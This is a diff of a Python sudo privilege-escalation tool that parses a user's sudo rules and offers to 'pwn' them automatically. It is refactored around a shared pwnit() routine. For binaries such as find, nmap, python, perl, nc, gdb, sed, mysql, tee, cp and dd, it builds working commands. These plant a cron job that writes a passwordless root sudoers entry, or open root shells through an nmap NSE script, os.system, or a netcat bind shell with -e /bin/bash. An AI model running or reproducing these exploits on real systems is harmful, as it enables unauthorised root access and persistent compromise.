@@ -19,7 +19,7 @@ import sys
 import argparse
 from subprocess import call
 from time import sleep
-
+from pprint import pprint
 
 # Arguments
 parser = argparse.ArgumentParser(description="This tool attempts to exploit bad sudo rules or shows you how to do it yourself!")
@@ -79,6 +79,7 @@ pwnage_script = "/tmp/pwnage.sh"
 
 pid = os.getpid()
 pwnage_complete_file = f"/tmp/pwnage_complete_{pid}"
+sudorules = {}
 
 def main():
     print(OKRED + banner + ENDC)
@@ -97,7 +98,7 @@ def sleep_and_display(seconds, trigger_file = ''):
         sleep(1)
     print()
 
-def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = ''):
+def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = ""):
         
     if dry_run:
         print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
@@ -173,7 +174,8 @@ def ask_user(answer):
 
 # Main section for sudo pwnage
 def sudopwner():
-	
+    global sudorules
+
     print(OKBLUE + "[+] Obtaining sudo rules for user " + username + ENDC + "\n")
 
     # Obtaining SUDO rules
@@ -184,134 +186,11 @@ def sudopwner():
 
     # Identifying sudo rules and choosing a potential pwnage for that rule
     print(OKBLUE + "\n[+] Identifying potential pwnage... \n" + ENDC)
-    choices = []
-    for item in sudorules:
-        if item[3] == "ALL":
-            all_user = item[0]
-            choices.append('all')
-        elif 'zip' in item[3].split('/'):
-            zip_user = item[0]
-            choices.append('zip')
-        elif 'find' in item[3].split('/'):
-            find_user = item[0]
-            choices.append('find')
-        elif 'tcpdump' in item[3].split('/'):
-            tcpdump_user = item[0]
-            choices.append('tcpdump')
-        elif 'rsync' in item[3].split('/'):
-            rsync_user = item[0]
-            choices.append('rsync')
-        elif 'python' in item[3].split('/'):
-            python_user = item[0]
-            choices.append('python')
-        elif 'vi' in item[3].split('/'):
-            vi_user = item[0]
-            choices.append('vi')
-        elif 'nmap' in item[3].split('/'):
-            nmap_user = item[0]
-            choices.append('nmap')
-        elif 'awk' in item[3].split('/'):
-            awk_user = item[0]
-            choices.append('awk')
-        elif 'vim' in item[3].split('/'):
-            vim_user = item[0]
-            choices.append('vim')
-        elif 'perl' in item[3].split('/'):
-            perl_user = item[0]
-            choices.append('perl')
-        elif 'ruby' in item[3].split('/'):
-            ruby_user = item[0]
-            choices.append('ruby')
-        elif 'bash' in item[3].split('/'):
-            bash_user = item[0]
-            choices.append('bash')
-        elif 'nc' in item[3].split('/'):
-            nc_user = item[0]
-            choices.append('nc')
-        elif 'less' in item[3].split('/'):
-            less_user = item[0]
-            choices.append('less')
-        elif 'more' in item[3].split('/'):
-            more_user = item[0]
-            choices.append('more')
-        elif 'man' in item[3].split('/'):
-            man_user = item[0]
-            choices.append('man')
-        elif 'gdb' in item[3].split('/'):
-            gdb_user = item[0]
-            choices.append('gdb')
-        elif 'ftp' in item[3].split('/'):
-            ftp_user = item[0]
-            choices.append('ftp')
-        elif 'smbclient' in item[3].split('/'):
-            smbclient_user = item[0]
-            choices.append('smbclient')
-        elif 'sed' in item[3].split('/'):
-            sed_user = item[0]
-            choices.append('sed')
-        elif 'mysql' in item[3].split('/'):
-            mysql_user = item[0]
-            choices.append('mysql')
-        elif 'tar' in item[3].split('/'):
-            tar_user = item[0]
-            choices.append('tar')
-        elif 'wget' in item[3].split('/'):
-            choices.append('wget')
-        elif 'curl' in item[3].split('/'):
-            choices.append('curl')
-        elif 'mv' in item[3].split('/'):
-            choices.append('mv')
-        elif 'tee' in item[3].split('/'):
-            choices.append('tee')
-        elif 'scp' in item[3].split('/'):
-            choices.append('scp')
-        elif 'ssh' in item[3].split('/'):
-            ssh_user = item[0]
-            choices.append('ssh')
-        elif 'cp' in item[3].split('/'):
-            choices.append('cp')
-        elif 'dd' in item[3].split('/'):
-            choices.append('dd')
-        elif 'crontab' in item[3].split('/'):
-            choices.append('crontab')
-        elif 'chown' in item[3].split('/'):
-            choices.append('chown')
-        elif 'chmod' in item[3].split('/'):
-            choices.append('chmod')
-        elif 'cat' in item[3].split('/'):
-            cat_user = item[0]
-            choices.append('cat')
-        elif 'mount' in item[3].split('/'):
-            choices.append('mount')
-        elif 'facter' in item[3].split('/'):
-            facter_user = item[0]
-            choices.append('facter')
-        elif 'apt-get' in item[3].split('/'):
-            choices.append('apt-get')
-        elif '/sh' in item[3].split('/'):
-            sh_user = item[0]
-            choices.append('sh')
-        elif 'ksh' in item[3].split('/'):
-            ksh_user = item[0]
-            choices.append('ksh')
-        elif 'zsh' in item[3].split('/'):
-            zsh_user = item[0]
-            choices.append('zsh')
-        elif 'nano' in item[3].split('/'):
-            nano_user = item[0]
-            choices.append('nano')
-        elif 'journalctl' in item[3].split('/'):
-            journalctl_user = item[0]
-            choices.append('journalctl')
-        elif 'dmesg' in item[3].split('/'):
-            dmesg_user = item[0]
-            choices.append('dmesg')
-        elif 'nice' in item[3].split('/'):
-            nice_user = item[0]
-            choices.append('nice')
 
     # Options for the user to choose which sudo rule they wish to abuse
-    for item in set(choices):
+    #for item in set(choices):
+    for itemrec in sudorules.items():
+        item = itemrec[0]
         if (item == "all") or (item == "sh") or (item == "bash") or (item == "ksh") or (item == "zsh"):
             print(OKRED + "[!] Vulnerable sudo rule [EASY TO PWN]: " + ENDC + item)
         else:
@@ -320,51 +199,55 @@ def sudopwner():
     question = input("\n" + OKBLUE + "[?] Enter name of sudo rule you wish to pwn: " + ENDC)
 
     if question == "all":
-        all(all_user)
+        all(sudorules[question]["runas_user"])
     elif question == "zip":
-        zip(zip_user)
+        zip(sudorules[question]["runas_user"])
     elif question == "find":
-        find(find_user)
+        find(sudorules[question]["runas_user"])
     elif question == "tcpdump":
-        tcpdump(tcpdump_user)
+        tcpdump(sudorules[question]["runas_user"])
     elif question == "rsync":
-        rsync(rsync_user)
+        rsync(sudorules[question]["runas_user"])
     elif question == "python":
-        python(python_user)
+        python(sudorules[question]["runas_user"])
+    elif question == "python2":
+        python2(sudorules[question]["runas_user"])
+    elif question == "python3":
+        python3(sudorules[question]["runas_user"])
     elif question == "vi":
-        vi(vi_user)
+        vi(sudorules[question]["runas_user"])
     elif question == "nmap":
-        nmap(nmap_user)
+        nmap(sudorules[question]["runas_user"])
     elif question == "awk":
-        awk(awk_user)
+        awk(sudorules[question]["runas_user"])
     elif question == "vim":
-        vim(vim_user)
+        vim(sudorules[question]["runas_user"])
     elif question == "perl":
-        perl(perl_user)
+        perl(sudorules[question]["runas_user"])
     elif question == "ruby":
-        ruby(ruby_user)
+        ruby(sudorules[question]["runas_user"])
     elif question == "bash":
-        bash(bash_user)
+        bash(sudorules[question]["runas_user"])
     elif question == "nc":
-        nc(nc_user)
+        nc(sudorules[question]["runas_user"])
     elif question == "less":
-        less(less_user)
+        less(sudorules[question]["runas_user"])
     elif question == "more":
-        more(more_user)
+        more(sudorules[question]["runas_user"])
     elif question == "man":
-        man(man_user)
+        man(sudorules[question]["runas_user"])
     elif question == "gdb":
-        gdb(gdb_user)
+        gdb(sudorules[question]["runas_user"])
     elif question == "ftp":
-        ftp(ftp_user)
+        ftp(sudorules[question]["runas_user"])
     elif question == "smbclient":
-        smbclient(smbclient_user)
+        smbclient(sudorules[question]["runas_user"])
     elif question == "sed":
-        sed(sed_user)
+        sed(sudorules[question]["runas_user"])
     elif question == "mysql":
-        mysql(mysql_user)
+        mysql(sudorules[question]["runas_user"])
     elif question == "tar":
-        tar(tar_user)
+        tar(sudorules[question]["runas_user"])
     elif question == "wget":
         wget()
     elif question == "curl":
@@ -376,7 +259,7 @@ def sudopwner():
     elif question == "scp":
         scp()
     elif question == "ssh":
-        ssh(ssh_user)
+        ssh(sudorules[question]["runas_user"])
     elif question == "cp":
         cp()
     elif question == "dd":
@@ -388,27 +271,27 @@ def sudopwner():
     elif question == "chmod":
         chmod()
     elif question == "cat":
-        cat(cat_user)
+        cat(sudorules[question]["runas_user"])
     elif question == "mount":
         mount()
     elif question == "facter":
-        facter(facter_user)
+        facter(sudorules[question]["runas_user"])
     elif question == "apt-get":
         aptget()
     elif question == "sh":
-        sh(sh_user)
+        sh(sudorules[question]["runas_user"])
     elif question == "ksh":
-        ksh(ksh_user)
+        ksh(sudorules[question]["runas_user"])
     elif question == "zsh":
-        zsh(zsh_user)
+        zsh(sudorules[question]["runas_user"])
     elif question == "nano":
-        nano(nano_user)
+        nano(sudorules[question]["runas_user"])
     elif question == "journalctl":
-        journalctl(journalctl_user)
+        journalctl(sudorules[question]["runas_user"])
     elif question == "dmesg":
-        dmesg(dmesg_user)
+        dmesg(sudorules[question]["runas_user"])
     elif question == "nice":
-        nice(nice_user)
+        nice(sudorules[question]["runas_user"])
     else:
         print(OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC)
         sys.exit()
@@ -440,6 +323,7 @@ def sudoparse():
      
     sudooutput = []
     commands_block = 0
+    commands_seen = set()  # To track 'cmd' values we've already appended
 
     # Loop through the SUDO rules gathed earlier
     with open('Output/sudorules.txt', 'r') as sudoers:
@@ -460,21 +344,35 @@ def sudoparse():
                 elif line.lower().startswith('commands') :
                     commands_block = 1
                 elif commands_block == 1:
-                    cmd = line.strip()
-                    if cmd and not cmd.startswith('Sudoers entry'):
-                        sudooutput.append([runas_user, runas_group, options, cmd])
+                    fullcmd = line.strip()
+                    cmd = fullcmd.split('/')[-1].split(' ')[0]
+                    if fullcmd and not fullcmd.startswith('Sudoers entry'):
+                        # Check if we have already seen this cmd
+                        if cmd in commands_seen:
+                            continue  # Skip if the cmd already exists
+                        # If it's a new cmd, add it to the set and append the dict to the list
+                        commands_seen.add(cmd)                        
+                        sudooutput.append({"runas_user": runas_user, "runas_group": runas_group, "options": options, "cmd": cmd,"fullcmd": fullcmd})
+
+    sudooutput_dict = {item['cmd']: {k: v for k, v in item.items() if k != 'cmd'} for item in sudooutput}
+    # pprint(sudooutput_dict)
 
     # Printing out SUDO rules for the user
     print(OKGREEN + "[!] " + username + " has the following sudo rules:" + ENDC)
-    for item in sudooutput:
-        print(OKGREEN + "\n[!] RunAsUsers: " + ENDC + item[0])
-        if item[1] != None:
-            print(OKGREEN + "[!] RunAsGroups: " + ENDC + item[1])
-        if item[2] != None:
-            print(OKGREEN + "[!] Options: " + ENDC + item[2])
-        print(OKGREEN + "[!] Commands: " + ENDC + item[3])
+    # for item in sudooutput_dict.items():
+    #     print("start\n")
+    #     pprint(sudooutput_dict[item[0]])
+    #     print("ready\n")
+    for itemrec in sudooutput_dict.items():
+        item = sudooutput_dict[itemrec[0]]
+        print(OKGREEN + "\n[!] RunAsUsers: " + ENDC + item['runas_user'])
+        if item['runas_group'] != None:
+            print(OKGREEN + "[!] RunAsGroups: " + ENDC + item['runas_group'])
+        if item['options'] != None:
+            print(OKGREEN + "[!] Options: " + ENDC + item['options'])
+        print(OKGREEN + "[!] Commands: " + ENDC + item['fullcmd'])
 
-    return sudooutput
+    return sudooutput_dict
 
 # SUDO zip Rule Pwnage
 def zip(zip_user):
@@ -557,13 +455,15 @@ def all(all_user):
 # SUDO find Rule Pwnage
 def find(find_user):
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo find {pwncron_script}  -exec chown root:root {pwncron_script} \; ;sudo find {pwncron_script}  -exec cp {pwncron_script} {pwncron_crond} \;"
     rule = "find"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} {pwncron_script}  -exec chown root:root {pwncron_script} \; ;sudo {cmd} {pwncron_script}  -exec cp {pwncron_script} {pwncron_crond} \;"
+    comments = ""
 
     if args.info:
 
-        pwnit(rule, exploit_cmd, pwnage_script_data,True)
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
@@ -572,7 +472,7 @@ def find(find_user):
 
         if question == True:
 
-            pwnit(rule, exploit_cmd, pwnage_script_data,False)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -716,37 +616,27 @@ def awk(awk_user):
 # SUDO nmap Rule Pwnage
 def nmap(nmap_user):
 
+    rule = "nmap"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo "os.execute('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.nse
+    sudo {cmd} --script=/tmp/pwnage.nse
+    """
+    comments = ""
+
     if args.info:
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
-        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-        print(OKBLUE + "[1] First create a malicious nse script to execute: " + ENDC)
-        print(OKRED + " [*] echo 'os.execute('/bin/sh')' > /tmp/pwnage.nse" + ENDC)
-        print(OKBLUE + "[2] Finally execute that nse script with nmap: " + ENDC)
-        if (nmap_user == "ALL") or (nmap_user == "root"): 
-            print(OKRED + " [*] sudo nmap --script=/tmp/pwnage.nse" + ENDC)
-        else:
-            print(OKRED + " [*] sudo -u " + nmap_user + " nmap --script=/tmp/pwnage.nse" + ENDC)
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
-    
-        question = ask_user( OKRED + "\n[?] Do you wish to abuse the nmap rule? " + ENDC)
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
 
         if question == True:
 
-            print(OKGREEN + "\n[!] Pwning the nmap rule now!!!" + ENDC)
-            print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)
-
-            call("echo 'os.execute('/bin/sh')' > /tmp/pwnage.nse", shell=True)
-
-            if (nmap_user == "ALL") or (nmap_user == "root"):
-                print(OKGREEN + "\n[!] Obtaining root shell!" + ENDC)
-                call("sudo nmap --script=/tmp/pwnage.nse", shell=True)
-            else:
-                print(OKGREEN + "\n[!] Obtaining shell as " + nmap_user + "!" + ENDC)
-                call("sudo -u " + nmap_user + " nmap --script=/tmp/pwnage.nse", shell=True)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -821,39 +711,84 @@ def vim(vim_user):
 # SUDO python Rule Pwnage
 def python(python_user):
 
+    rule = "python"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
+    sudo {cmd} /tmp/pwnage.{pid}
+    """
+    comments = ""
+
     if args.info:
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
-        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-        print(OKBLUE + "[1] First create a malicious python script: " + ENDC)
-        print(OKRED + " [*] echo 'os.system('/bin/bash)' > /tmp/pwnage.py" + ENDC)
-        print(OKBLUE + "[2] Finally execute that python script to get your shell: " + ENDC)
-        if (python_user == "ALL") or (python_user == "root"):
-            print(OKRED + " [*] sudo python /tmp/pwnage.py" + ENDC)
-        else:
-            print(OKRED + " [*] sudo -u " + python_user + " python /tmp/pwnage.py" + ENDC)
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
-    
-        question = ask_user( OKRED + "\n[?] Do you wish to abuse the python rule? " + ENDC)
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
 
         if question == True:
 
-            print(OKGREEN + "\n[!] Pwning the python rule now!!!" + ENDC)
-            print(OKGREEN + "\n[!] Creating the malcious file now!" + ENDC)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
-            call("echo 'os.system('/bin/bash')' > /tmp/pwnage.py", shell=True)
+        if question == False:
+            sudopwner()
 
-            print(OKGREEN + "\n[!] Obtaining shell!" + ENDC)
 
-            if (python_user == "ALL") or (python_user == "root"):
-                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
-                call("sudo python /tmp/pwnage.py", shell=True)
-            else:
-                print(OKGREEN + "\n[!] Obtaining shell as " + python_user + "!" + ENDC)
-                call("sudo -u " + python_user + " python /tmp/pwnage.py", shell=True)
+# SUDO python2 Rule Pwnage
+def python2(python_user):
+
+    rule = "python2"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
+    sudo {cmd} /tmp/pwnage.{pid}
+    """
+    comments = ""
+
+    if args.info:
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
+        sys.exit()
+
+    elif args.autopwn:
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
+
+        if question == True:
+
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
+
+        if question == False:
+            sudopwner()
+
+# SUDO python3 Rule Pwnage
+def python3(python_user):
+
+    rule = "python3"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo "import os\nos.system('cp {pwncron_script} {pwncron_crond}')" > /tmp/pwnage.{pid}
+    sudo {cmd} /tmp/pwnage.{pid}
+    """
+    comments = ""
+
+    if args.info:
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
+        sys.exit()
+
+    elif args.autopwn:
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
+
+        if question == True:
+
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -862,10 +797,11 @@ def python(python_user):
 # SUDO perl Rule Pwnage
 def perl(perl_user):
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo perl -e 'system(\"cp {pwncron_script} {pwncron_crond}\")'"
-    comments = ""
     rule = "perl"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} -e 'system(\"cp {pwncron_script} {pwncron_crond}\")'"
+    comments = ""
 
     if args.info:
 
@@ -959,44 +895,31 @@ def bash(bash_user):
 
 
 # SUDO nc Rule Pwnage
-def nc(nc_user):
+def nc():
+
+    rule = "nc"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+sudo {cmd} -lvp 8888 -e '/bin/bash' &
+sleep 2
+( sleep 5 && killall cat ) &
+(echo "cp {pwncron_script} {pwncron_crond}"; cat;) | {cmd}  127.0.0.1 8888
+"""    
+    comments = ""
 
     if args.info:
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
-        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-        print(OKBLUE + "[1] First open a port using sudo and background it so you can connect to it in the same terminal: " + ENDC)
-        if (nc_user == "ALL") or (nc_user == "root"):
-            print(OKRED + " [*] sudo /bin/nc -lvp 8888 -e '/bin/bash' &" + ENDC)
-            print(OKBLUE + "[2] Finally connect to that port using sudo: " + ENDC)
-            print(OKRED + " [*] sudo /bin/nc -vvv 127.0.0.1 8888" + ENDC)
-        else:
-            print(OKRED + " [*] sudo -u " + nc_user + " /bin/nc -lvp 8888 -e '/bin/bash' &" + ENDC)
-            print(OKBLUE + "[2] Finally connect to that port using sudo: " + ENDC)
-            print(OKRED + " [*] sudo -u " + nc_user + " /bin/nc -vvv 127.0.0.1 8888" + ENDC)
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
-    
-        question = ask_user(OKRED + "\n[?] Do you wish to abuse the nc rule? " + ENDC)
+
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
 
         if question == True:
 
-            print(OKGREEN + "[!] Pwning the nc rule now!!!" + ENDC)
-            if (nc_user == "ALL") or (nc_user == "root"):
-                print(OKGREEN + "[!] Opening port on 8888 as root" + ENDC)
-                call("sudo /bin/nc -lvp 8888 -e '/bin/bash' &", shell=True)
-
-                print(OKGREEN + "[!] Connecting to port on 8888 to obtain root shell!" + ENDC)
-                call("sudo /bin/nc -vvv 127.0.0.1 8888", shell=True)
-            else:
-                print(OKGREEN + "[!] Opening port on 8888 as " + nc_user + ENDC)
-                call("sudo -u " + nc_user + " /bin/nc -lvp 8888 -e '/bin/bash' &", shell=True)
-
-                print(OKGREEN + "[!] Connecting to port 8888 to obtain shell as " + nc_user + "!" + ENDC)
-                call("sudo -u " + nc_user + " /bin/nc -vvv 127.0.0.1 8888", shell=True)
-                
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -1053,16 +976,18 @@ def man(man_user):
 # SUDO gdb Rule Pwnage
 def gdb(gdb_user):
 
+    rule = "gdb"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
     gdb_script = f"/tmp/gdb.{pid}"
     with open(gdb_script, 'w') as output_file:
         output_file.write(f"!/bin/bash -c 'cp {pwncron_script} {pwncron_crond}'")
     pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo gdb -batch -x {gdb_script}"
-    rule = "gdb"
+    exploit_cmd = f"sudo {cmd} -batch -x {gdb_script}"
+    comments = ""
 
     if args.info:
 
-        pwnit(rule, exploit_cmd, pwnage_script_data,True)
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
@@ -1071,7 +996,7 @@ def gdb(gdb_user):
 
         if question == True:
 
-            pwnit(rule, exploit_cmd, pwnage_script_data,False)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -1116,10 +1041,11 @@ def smbclient(smbclient_user):
 # SUDO sed Rule Pwnage
 def sed(sed_user):
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"echo 'cp {pwncron_script} {pwncron_crond}' | sudo sed e"
-    comments = ""
     rule = "sed"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"echo 'cp {pwncron_script} {pwncron_crond}' | sudo {cmd} e"
+    comments = ""
 
     if args.info:
 
@@ -1141,13 +1067,15 @@ def sed(sed_user):
 # SUDO mysql Rule Pwnage
 def mysql(mysql_user):
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo mysql -e '\! /bin/bash -c \"cp {pwncron_script} {pwncron_crond}\"'"
     rule = "mysql"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} -e '\! /bin/bash -c \"cp {pwncron_script} {pwncron_crond}\"'"
+    comments = ""
 
     if args.info:
 
-        pwnit(rule, exploit_cmd, pwnage_script_data,True)
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
 
     elif args.autopwn:
@@ -1156,7 +1084,7 @@ def mysql(mysql_user):
 
         if question == True:
 
-            pwnit(rule, exploit_cmd, pwnage_script_data,False)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
@@ -1268,10 +1196,11 @@ def curl():
 # SUDO mv Rule Pwnage
 def mv():
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo mv {pwncron_script} {pwncron_crond}"
-    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."
     rule = "mv"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} {pwncron_script} {pwncron_crond}"
+    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."
 
     if args.info:
 
@@ -1293,10 +1222,11 @@ def mv():
 # SUDO tee Rule Pwnage
 def tee():
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"cat {pwncron_script} | sudo tee {pwncron_crond}"
-    comments = ""
     rule = "tee"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"cat {pwncron_script} | sudo {cmd} {pwncron_crond}"
+    comments = ""
 
     if args.info:
 
@@ -1383,10 +1313,11 @@ def ssh(ssh_user):
 # SUDO cp Rule Pwnage
 def cp():
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo cp {pwncron_script} {pwncron_crond}"
-    comments = ""
     rule = "cp"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} {pwncron_script} {pwncron_crond}"
+    comments = ""
 
     if args.info:
 
@@ -1408,10 +1339,11 @@ def cp():
 # SUDO dd Rule Pwnage
 def dd():
 
-    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo dd if={pwncron_script} of={pwncron_crond}"
-    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."
     rule = "dd"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"sudo {cmd} if={pwncron_script} of={pwncron_crond}"
+    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."
 
     if args.info:
 
